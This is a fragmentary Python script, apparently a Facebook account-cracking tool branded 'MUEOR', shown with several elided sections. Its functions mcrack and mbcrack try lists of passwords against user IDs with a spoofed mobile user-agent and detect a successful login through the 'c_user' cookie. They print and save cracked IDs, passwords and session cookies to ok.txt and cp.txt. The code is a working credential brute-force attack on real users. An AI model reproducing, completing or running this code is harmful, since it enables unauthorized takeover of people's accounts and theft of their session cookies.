...
#def MUEOR🤬_TRICKER():
	#os.system('clear')
	#print(logo)
	os.system('xdg-open https://facebook.com/groups/901439714301627/')
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r \x1b[1;92m[MUEOR🤬] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
			sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				cid = "1000"+coki1[0:11]
				print('\33[1;92m[MUEOR🤬-OK] '+cid+' | '+ps+'\33[0;97m')
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print('\33[1;93m[MUEOR🤬-CP] '+cid+' | '+ps+'\33[0;97m')
...
def mbcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;32m[MUEOR🤬-OK] '+cid+' | '+ps+'\033[1;32m')
				print("\033[1;92m[•] Cookie: "+coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				ok.append(cid)
				break
				...
				coki1 = coki.split("1000")[1]
				cid = "1000"+coki1[0:11]
				print(' \033[1;33m[MUEOR🤬-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cp.append(cid)
				break
			else:
